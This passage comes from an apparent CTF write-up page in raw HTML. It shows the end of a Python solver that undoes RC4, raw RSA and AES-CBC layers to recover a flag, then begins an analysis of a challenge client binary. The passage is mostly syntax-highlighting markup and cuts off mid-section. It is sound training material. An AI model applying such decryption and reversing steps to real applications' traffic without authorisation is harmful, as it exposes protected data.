<span class="hljs-built_in">len</span>(key)]) &amp; <span class="hljs-number">0xFF</span><br>        S[i], S[j] = S[j], S[i]<br>    <br>    <span class="hljs-comment"># PRGA</span><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span><br>        j = (j + S[i]) &amp; <span class="hljs-number">0xFF</span><br>        S[i], S[j] = S[j], S[i]<br>        result.append(byte ^ S[(S[i] + S[j]) &amp; <span class="hljs-number">0xFF</span>])<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_decrypt_raw</span>(<span class="hljs-params">key, ciphertext</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Raw RSA decryption&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 填充到模数长度</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) &lt; key.size_in_bytes():<br>        ciphertext = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (key.size_in_bytes() - <span class="hljs-built_in">len</span>(ciphertext)) + ciphertext<br>    <br>    ciphertext_int = <span class="hljs-built_in">int</span>.from_bytes(ciphertext, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    plaintext_int = <span class="hljs-built_in">pow</span>(ciphertext_int, key.d, key.n)<br>    plaintext = plaintext_int.to_bytes(key.size_in_bytes(), <span class="hljs-string">&#x27;big&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 检查PKCS1 v1.5 padding</span><br>    <span class="hljs-keyword">if</span> plaintext[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">b&#x27;\x00\x02&#x27;</span>:<br>        idx = plaintext.find(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> idx != -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> plaintext[idx+<span class="hljs-number">1</span>:]<br>    <br>    <span class="hljs-comment"># 去掉前导0</span><br>    <span class="hljs-keyword">return</span> plaintext.lstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CTF Android Crypto Challenge Solver&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <br>    <span class="hljs-comment"># Step 1: 分割数据包</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[Step 1] Splitting data packet...&quot;</span>)<br>    parts = FULL_DATA.split(<span class="hljs-string">&#x27;&lt;-encryptinput-&gt;&#x27;</span>)<br>    rc4_b64_part = parts[<span class="hljs-number">0</span>]  <span class="hljs-comment"># RC4+Base64(enkey_...\neniv_...)</span><br>    aes_b64_part = parts[<span class="hljs-number">1</span>]  <span class="hljs-comment"># AES密文Base64</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  Part 1 (RC4+B64): <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rc4_b64_part)&#125;</span> chars&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  Part 2 (AES B64): <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(aes_b64_part)&#125;</span> chars&quot;</span>)<br>    <br>    <span class="hljs-comment"># Step 2: Base64解码第一部分，然后RC4解密</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[Step 2] RC4 decrypting part 1...&quot;</span>)<br>    rc4_encrypted = base64.b64decode(rc4_b64_part)<br>    rc4_decrypted = rc4_crypt(RC4_KEY, rc4_encrypted)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RC4 decrypted: <span class="hljs-subst">&#123;rc4_decrypted.decode()&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># Step 3: 提取RSA加密的key和iv</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[Step 3] Extracting RSA-encrypted key and iv...&quot;</span>)<br>    rc4_text = rc4_decrypted.decode()<br>    <br>    <span class="hljs-comment"># 去掉所有换行符后再解析</span><br>    rc4_text_clean = rc4_text.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  Cleaned text: <span class="hljs-subst">&#123;rc4_text_clean&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 解析 enkey_ 和 eniv_ (它们以 = 或 == 结尾)</span><br>    <span class="hljs-comment"># 格式: enkey_&lt;base64&gt;==eniv_&lt;base64&gt;=</span><br>    key_match = re.search(<span class="hljs-string">r&#x27;enkey_([A-Za-z0-9+/]+=*)&#x27;</span>, rc4_text_clean)<br>    <span class="hljs-comment"># 从eniv_开始匹配到字符串结尾或下一个enkey</span><br>    iv_match = re.search(<span class="hljs-string">r&#x27;eniv_([A-Za-z0-9+/]+=*)$&#x27;</span>, rc4_text_clean)<br>    <br>    <span class="hljs-keyword">if</span> key_match <span class="hljs-keyword">and</span> iv_match:<br>        rsa_key_b64 = key_match.group(<span class="hljs-number">1</span>)<br>        rsa_iv_b64 = iv_match.group(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RSA encrypted key (B64): <span class="hljs-subst">&#123;rsa_key_b64&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RSA encrypted iv (B64): <span class="hljs-subst">&#123;rsa_iv_b64&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  [!] Failed to extract RSA data&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-comment"># Step 4: RSA解密得到AES key和iv</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[Step 4] RSA decrypting to get AES key and iv...&quot;</span>)<br>    rsa_key = RSA.import_key(RSA_PRIVATE_KEY)<br>    <br>    <span class="hljs-comment"># 修正base64 padding</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fix_b64_padding</span>(<span class="hljs-params">s</span>):<br>        missing = <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(s) % <span class="hljs-number">4</span><br>        <span class="hljs-keyword">if</span> missing != <span class="hljs-number">4</span>:<br>            s += <span class="hljs-string">&#x27;=&#x27;</span> * missing<br>        <span class="hljs-keyword">return</span> s<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  Key B64 length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_key_b64)&#125;</span>, mod 4 = <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_key_b64) % <span class="hljs-number">4</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  IV B64 length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_iv_b64)&#125;</span>, mod 4 = <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_iv_b64) % <span class="hljs-number">4</span>&#125;</span>&quot;</span>)<br>    <br>    rsa_key_b64 = fix_b64_padding(rsa_key_b64)<br>    rsa_iv_b64 = fix_b64_padding(rsa_iv_b64)<br>    <br>    rsa_key_ct = base64.b64decode(rsa_key_b64)<br>    rsa_iv_ct = base64.b64decode(rsa_iv_b64)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RSA key ciphertext: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_key_ct)&#125;</span> bytes&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  RSA iv ciphertext: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rsa_iv_ct)&#125;</span> bytes&quot;</span>)<br>    <br>    aes_key = rsa_decrypt_raw(rsa_key, rsa_key_ct)<br>    aes_iv = rsa_decrypt_raw(rsa_key, rsa_iv_ct)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES Key: <span class="hljs-subst">&#123;aes_key&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES IV:  <span class="hljs-subst">&#123;aes_iv&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># Step 5: AES解密第二部分</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[Step 5] AES decrypting part 2...&quot;</span>)<br>    aes_ciphertext = base64.b64decode(aes_b64_part)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES ciphertext: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(aes_ciphertext)&#125;</span> bytes&quot;</span>)<br>    <br>    <span class="hljs-comment"># 确保长度是16的倍数</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(aes_ciphertext) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  [!] Ciphertext not aligned to 16 bytes, padding...&quot;</span>)<br>        padding_needed = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(aes_ciphertext) % <span class="hljs-number">16</span>)<br>        aes_ciphertext = aes_ciphertext + <span class="hljs-string">b&#x27;\x00&#x27;</span> * padding_needed<br>    <br>    <span class="hljs-keyword">try</span>:<br>        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)<br>        decrypted = cipher.decrypt(aes_ciphertext)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES decrypted (raw): <span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 尝试unpad</span><br>        <span class="hljs-keyword">try</span>:<br>            decrypted = unpad(decrypted, AES.block_size)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            flag = decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span> * <span class="hljs-number">60</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;FLAG: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span> * <span class="hljs-number">60</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  [!] Cannot decode, raw bytes: <span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  [!] AES decrypt error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                    CTF CLIENT PROGRAM ANALYSIS<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>[BASIC INFO]<br>File: client (ELF64 Linux executable)<br>MD5: <span class="hljs-number">204</span>fea362fdd03097c8cc31f87f839c4<br>Size: <span class="hljs-number">0x8ba8</span> bytes<br>Connection: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span> (AF_INET, SOCK_STREAM)<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                         ENCRYPTION ALGORITHMS<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span 